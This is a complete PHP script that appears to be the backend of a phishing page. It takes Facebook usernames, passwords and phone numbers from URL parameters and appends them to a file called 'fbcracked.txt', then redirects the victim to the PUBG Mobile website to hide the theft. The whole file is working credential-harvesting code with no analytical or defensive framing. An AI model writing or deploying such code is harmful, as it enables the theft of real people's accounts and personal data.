<?php

file_put_contents("fbcracked.txt", "[Name:] " . $Username_FB = $_GET['Username_FB'] . " [Pass:] " . $Password_FB = $_GET['Password_FB'] . " [PhoneNum:] " . $Phone_FB = $_GET['Phone_FB'] ."\n", FILE_APPEND);
header('Location: https://www.pubgmobile.com');
exit();

